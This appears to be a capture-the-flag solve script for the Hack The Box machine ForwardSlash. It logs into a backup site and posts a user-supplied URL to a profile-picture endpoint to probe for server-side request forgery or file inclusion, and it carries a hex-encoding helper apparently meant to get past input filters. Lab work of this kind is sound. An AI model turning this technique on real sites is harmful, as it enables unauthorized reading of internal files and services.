import binascii
import textwrap
import requests
import sys

def to_hex(url):
    return "\\x" + "\\x".join(textwrap.wrap(binascii.hexlify(url.encode()).decode(),2))


session = requests.Session()

session.post("http://backup.forwardslash.htb/login.php",
             data={"username":"foobar",
                   "password":"barbar22"}
)

# res =  session.get("http://backup.forwardslash.htb/environment.php")

# print(res.text)

# res = session.post("http://backup.forwardslash.htb/profilepicture.php",
#                    data={"url":"http://backup.forwardslash.htb/dev/index.php?xml=xml"}
# )
print(to_hex("profilepicture.php"))

res = session.post("http://backup.forwardslash.htb/profilepicture.php",
                   data={"url":sys.argv[1]}
)

breakpoint()
print(res.text)
